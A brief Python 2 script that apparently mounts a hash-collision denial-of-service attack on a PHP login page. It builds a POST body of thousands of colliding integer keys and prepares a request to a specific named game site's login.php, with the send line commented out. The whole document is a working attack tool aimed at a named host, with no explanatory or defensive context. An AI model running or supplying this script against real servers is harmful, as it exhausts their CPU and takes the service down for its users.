#!/usr/bin/python

import time
import urllib
import urllib2

size = 2 ** 16
starttime = time.time()
key=0
maxkey = (size - 1) * size
print 'maxkey', maxkey

array={'userid':'kk',
        'passwd':'kk',}

while key <= maxkey:
    array[key] = 0
    key += size
    param = urllib.urlencode(array)
    print param
    req = urllib2.Request("http://game.slwan.com/login.php", data=param, headers={})
    #resp = urllib2.urlopen(req)

